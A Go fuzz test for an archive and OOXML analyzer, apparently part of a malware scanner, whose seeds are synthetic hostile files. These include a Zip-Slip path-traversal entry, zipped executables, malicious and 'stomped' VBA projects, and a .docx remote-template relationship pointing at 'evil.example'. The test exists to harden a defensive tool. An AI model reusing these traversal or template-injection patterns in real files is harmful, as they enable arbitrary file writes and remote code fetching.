package archive

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"testing"
)

// FuzzAnalyze drives the container walks with mutated input. The readers consume
// untrusted, attacker-controlled structures — a ZIP central directory, TAR
// headers, a gzip body — through the standard library behind member, read and
// decompression caps. The invariant is that Analyze never panics and always
// returns a non-nil result, that a non-archive buffer stays a clean zero-score
// result, and that the reported score equals the sum of the finding weights.
//
// Seeds cover an empty buffer, plain text, a benign zip, a single-exe zip, a
// Zip-Slip zip, a benign tar, a gzip of an executable, a tar.gz, truncated
// variants of each magic, and the OOXML shapes: a macro-free .docx, an .xlsm
// whose xl/vbaProject.bin is a synthetic VBA project (the OLE walk runs over
// the decompressed member behind its own caps), a .docx with a remote
// attachedTemplate relationship, and a vbaProject.bin that is not a compound
// file. Mutations of these reach the zip member decompression, the OLE parser
// and the relationship XML walk, all of which must stay within their caps.
func FuzzAnalyze(f *testing.F) {
	zf := func(entries ...zipEntry) []byte {
		var buf bytes.Buffer
		zw := zip.NewWriter(&buf)
		for _, e := range entries {
			w, _ := zw.Create(e.name)
			w.Write(e.data)
		}
		zw.Close()
		return buf.Bytes()
	}
	tf := func(entries ...zipEntry) []byte {
		var buf bytes.Buffer
		tw := tar.NewWriter(&buf)
		for _, e := range entries {
			tw.WriteHeader(&tar.Header{Name: e.name, Mode: 0o644, Size: int64(len(e.data)), Typeflag: tar.TypeReg})
			tw.Write(e.data)
		}
		tw.Close()
		return buf.Bytes()
	}
	gf := func(body []byte) []byte {
		var buf bytes.Buffer
		gw := gzip.NewWriter(&buf)
		gw.Write(body)
		gw.Close()
		return buf.Bytes()
	}

	benignZip := zf(zipEntry{"a.txt", []byte("hi")}, zipEntry{"b/c.go", []byte("package b")})
	singleExe := zf(zipEntry{"p.exe", mz(64)})
	slip := zf(zipEntry{"../../x", []byte("y")})
	benignTar := tf(zipEntry{"m.c", []byte("int main(){}")})
	gzExe := gf(mz(300))
	tgz := gf(tf(zipEntry{"x", []byte("y")}, zipEntry{"z.vbs", []byte("WScript")}))
	docx := zf(officeDoc("word")...)
	xlsm := zf(append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaMalicious()})...)
	stomped := zf(append(officeDoc("xl"), zipEntry{"xl/vbaProject.bin", vbaStomped()})...)
	remoteTemplate := zf(append(officeDoc("word"),
		zipEntry{"word/_rels/settings.xml.rels", settingsRels("http://evil.example/t.dotm", "External")})...)
	notOLE := zf(append(officeDoc("ppt"), zipEntry{"ppt/vbaProject.bin", []byte("PK\x03\x04 not a compound file")})...)

	seeds := [][]byte{
		{}, []byte("not an archive at all"),
		benignZip, singleExe, slip, benignTar, gzExe, tgz,
		[]byte("PK\x03\x04"), []byte{0x1f, 0x8b, 0x08}, append(bytes.Repeat([]byte{0}, 257), []byte("ustar\x00")...),
		benignZip[:len(benignZip)/2], tgz[:len(tgz)/2],
		docx, xlsm, stomped, remoteTemplate, notOLE, xlsm[:len(xlsm)/2],
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		r := Analyze(data, Options{})
		if r == nil {
			t.Fatal("Analyze returned nil")
		}
		if !IsArchive(data) {
			if r.Score != 0 || len(r.Findings) != 0 || r.Parsed != nil {
				t.Fatalf("non-archive buffer produced output: %+v", r)
			}
			return
		}
		sum := 0
		for _, fnd := range r.Findings {
			sum += fnd.Score
		}
		if sum != r.Score {
			t.Fatalf("score %d does not match finding sum %d: %+v", r.Score, sum, r.Findings)
		}
		// The embedded VBA result, when present, is bounded by the member cap
		// and its findings are exactly the archive.ooxml.* ones carried.
		if v := r.EmbeddedVBA; v != nil {
			if v.Size > maxVBAProjectBytes {
				t.Fatalf("embedded VBA project of %d bytes exceeds the cap", v.Size)
			}
			carried := 0
			for _, fnd := range r.Findings {
				if fnd.Via == v.FilePath && fnd.Class != "archive.ooxml.remote-template" {
					carried++
				}
			}
			if carried != len(v.Findings) {
				t.Fatalf("%d OLE findings, %d carried: %+v", len(v.Findings), carried, r.Findings)
			}
		}
	})
}
